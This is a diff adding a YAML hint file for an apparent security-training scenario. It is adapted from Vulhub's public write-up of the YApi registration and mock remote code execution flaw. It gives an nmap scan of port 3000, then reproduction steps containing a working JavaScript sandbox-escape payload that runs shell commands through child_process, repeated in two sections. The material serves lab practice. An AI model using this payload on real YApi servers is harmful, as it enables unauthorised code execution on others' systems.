@@ -1,0 +1,100 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: yapi/unacc
+hint_levels:
+  low:
+  - Inspect the yapi service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 3000. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 3000 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 3000/tcp → container 3000/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  high:
+  - 'Vulnerability: YApi Registration and Mock Remote Code Execution.'
+  - |-
+    Vulnerability Reproduce
+
+    Register a normal user then create a project and an interface:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/1.png
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/2.png
+
+    There is a "Mock Tab" that you can input JavaScript code, put the evil code into textarea:
+
+    ```
+    const sandbox = this
+    const ObjectConstructor = this.constructor
+    const FunctionConstructor = ObjectConstructor.constructor
+    const myfun = FunctionConstructor('return process')
+    const process = myfun()
+    mockJson = process.mainModule.require("child_process").execSync("id;uname -a;pwd").toString()
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/3.png
+
+    Then, go back to the preview tab and see the Mock URL:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/4.png
+
+    Open that URL, Mock script is executed and you can see the output:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/5.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/README.md'
+  - |-
+    Additional public references:
+    - https://paper.seebug.org/1639/
+    - https://www.freebuf.com/vuls/279967.html
+access_instructions:
+  title: YApi Registration and Mock Remote Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 3000. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 3000 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 3000/tcp → container 3000/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+  - title: Vulnerability Reproduce
+    instructions: |-
+      Register a normal user then create a project and an interface:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/1.png
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/2.png
+
+      There is a "Mock Tab" that you can input JavaScript code, put the evil code into textarea:
+
+      ```
+      const sandbox = this
+      const ObjectConstructor = this.constructor
+      const FunctionConstructor = ObjectConstructor.constructor
+      const myfun = FunctionConstructor('return process')
+      const process = myfun()
+      mockJson = process.mainModule.require("child_process").execSync("id;uname -a;pwd").toString()
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/3.png
+
+      Then, go back to the preview tab and see the Mock URL:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/4.png
+
+      Open that URL, Mock script is executed and you can see the output:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/5.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/yapi/unacc/README.md
+  readme_sha256: d82b4364d469ef55373e1a4de1986ca01d846c0f8fdd8daa35b1707edf44abca
+  compose_sha256: 2e14b1e3ff9d0069881bdd70076f95574f042ebff5daaadace3803630e013213
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
